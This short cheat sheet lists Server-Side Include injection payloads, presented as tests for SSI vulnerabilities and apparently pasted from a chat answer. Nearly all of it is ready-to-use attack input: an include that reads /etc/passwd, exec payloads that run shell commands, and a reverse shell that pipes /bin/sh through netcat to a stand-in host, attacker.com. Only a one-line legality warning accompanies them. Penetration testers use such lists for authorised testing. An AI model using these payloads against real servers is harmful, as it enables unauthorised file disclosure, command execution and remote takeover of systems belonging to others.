Common SSI Injection Payloads
Here are some example payloads you can use to test for SSI vulnerabilities:

1. Basic SSI Execution Test
html
Copy
Edit
<!--#echo var="DATE_LOCAL"-->
Expected Behavior: If the server processes SSI, it will return the current date/time.

2. File Disclosure
html
Copy
Edit
<!--#include file="/etc/passwd"-->
Expected Behavior: If successful, this could leak system files on a Unix-based server.

3. Command Execution
html
Copy
Edit
<!--#exec cmd="ls -la"-->
html
Copy
Edit
<!--#exec cmd="cat /etc/passwd"-->
Expected Behavior: Executes system commands, potentially exposing sensitive data.

4. Reverse Shell Example
If the server allows execution, you might be able to establish a reverse shell:

html
Copy
Edit
<!--#exec cmd="nc -e /bin/sh attacker.com 4444"-->
Warning: Running this on a live server without permission is illegal.
